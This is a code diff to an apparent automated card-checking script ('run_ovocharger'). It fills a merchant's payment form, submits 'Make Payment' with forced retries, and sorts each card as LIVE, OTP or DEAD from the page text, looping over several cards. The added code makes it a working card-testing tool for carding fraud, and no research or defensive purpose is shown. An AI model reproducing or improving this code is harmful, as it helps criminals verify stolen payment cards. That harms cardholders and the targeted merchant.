@@ -68,14 +68,53 @@ async def run_ovocharger(user_id: int, card_details: str):
             await page.fill('#address1', address1)
             await page.fill('#city', city)
             await page.fill('#emailForConfirmation', email)
-            await page.fill('#mobileNumberForSmsConfirmation', '07454805800')
+            await page.fill('#mobileNumberForSmsConfirmation', '07458282800')
             await page.check('input[name="AcceptedTermsAndConditions"]')
+
+
+
+            # Click the Make Payment button
+            button_locator = page.locator('input#makePayment')
+            # Try clicking once
+            await button_locator.click(force=True, timeout=10000)
+            await page.wait_for_timeout(2000)  # brief pause after click
+            # Check if button still visible — retry if needed
+            for attempt in range(2):  # retry up to 2 times
+                if await button_locator.is_visible():
+                    print(f"[Retry] Button still visible. Retrying click... (Attempt {attempt + 1})")
+                    await button_locator.click(force=True)
+                    await page.wait_for_timeout(2000)
+                else:
+                    break
+            else:
+                print("[Warning] Button still visible after 2 retries.")
+
+            await page.wait_for_timeout(15000)  # brief pause after click
+            
+            status = "UNKNOWN"
+            for frame in page.frames:
+                try:
+                    content = await frame.content()
+                    text = content.lower()
+                    if "payment authorised" in text:
+                        status = "LIVE"
+                        break
+                    elif any(w in text for w in ["verify", "otp", "authorise", "mobile app"]):
+                        status = "OTP"
+                        break
+                    elif "declined" in text:
+                        status = "DEAD"
+                        break
+                except Exception:
+                    continue
+
+
+            
 
             screenshot_bytes = await page.screenshot(full_page=True)
 
-            result = "Success"
             await browser.close()
-            return result, screenshot_bytes
+            return status, screenshot_bytes
 
         except Exception as e:
             await browser.close()
@@ -103,6 +142,7 @@ if __name__ == "__main__":
     for idx, (result, screenshot) in enumerate(results):
         print(f"Card {idx+1} result: {result}")
         # optionally save screenshots
+
 
 
 
